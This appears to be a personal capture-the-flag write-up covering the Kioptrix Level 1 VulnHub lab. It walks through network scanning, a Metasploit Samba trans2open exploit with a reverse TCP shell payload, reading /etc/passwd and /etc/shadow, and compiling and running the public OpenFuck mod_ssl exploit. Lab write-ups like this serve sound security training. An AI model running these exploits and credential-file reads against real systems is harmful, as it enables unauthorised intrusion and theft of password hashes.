# Kioptrix-level 1
(Screenshots are going to be seperate)
Hey so I'm going to be be going over the process of pwning kioptrix level 1 vulnhub machine. So I started off by using Arpscan to scan for available devices so:
```arp-scan -l```
Then I was going to identify it using the MAC address, so in my case I was looking on all possible vendors and eliminating what's not useful. So in my case the MAC address was ```1a:c0:1e:91:41:b9``` you can usually also lookup MAC addresses online because first 3 octets identify the vendor so whatever comes from a specific vendor has the sama first 3 octets (OUI or Organizational Unique Identifier) and the last 3 (NIC or Network Interface Controller) are special for each device. So in my case it was unknown for the vendor possibly because it was hosted on a vm. So in the Arp scan along with the MAC address you get an IP address in my case it was ```192.168.1.44```. Then my next step was to scan that IP address using NMAP to see possible open ports and other information so I used ```nmap -T4 -A -p- 192.168.1.44``` or for realistic taste you can try ```nmap -T4 -sS -A -p- 192.168.1.44``` and the latter I added the "-sS" for stealth scan. So in my results I had 6 open tcp ports (22, 80, 111, 139, 443, 32768). So I ran nikto then went to watch the http and https: ```nikto -h http://192.168.1.44``` as I went to the website it was a default apache page so if that was a real pentest that would give us an idea about the hygiene of the client (awful). In most cases that http with poor hygiene is a finding but after I ran dirbuster it turned it that it didn't have anything important. So we also have the smb port open very important we can run metasploit to scan the version so:
```msfconsole```
```use auxiliary/scanner/smb/smb_version```
```options```
```set RHOSTS 192.168.1.44```
```run```
So the results we got that it's running "Unix (Samba 2.2.1a)"
we can google "Unix (Samba 2.2.1a) exploits" or we can try to login with smbclient to the address (but it failed).
So it's possibly vulnerable to "Samba trans2open Overflow (Linux x86)" by rapid 7 (metasploit) so let's see:
```msfconsole```
```use exploit/linux/samba/trans2open```
```option```
```set LHOST```
```set RHOSTS```
```run``` or ```exploit```
Most likely it's not going to work so a soultion that has worked to me was to change the current payload "linux/x86/shell_reverse_tcp" so :
```set payload linux/x86/shell_reverse_tcp```
```run``` or ```exploit```
Then Most likely you will have a shell. From here you can ```cd``` until you get to home then ```cd etc``` then ```cat passwd``` and ```cat shadow```
So that's the metasploit route, now let's try to use a manual exploit. So in the scanning I found "mode SSL" on https (Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b). So I looked on google for compatible exploits and found "OpenLuck" on github by heltonWernik. So follow the direction ->
```git clone https://github.com/heltonWernik/OpenFuck.git```
```apt-get install libssl-dev```
```gcc -o OpenFuck OpenFuck.c -lcrypto```
```./OpenFuck```
Now we are going to start using the exploit
```./OpenFuck 0x6b 192.168.1.44 -c 40```
You should get a shell
then try things like:
```whoami```
```hostname```
So that was it for this machine, I hope y'all learned something or more and hopefully there will be more content.
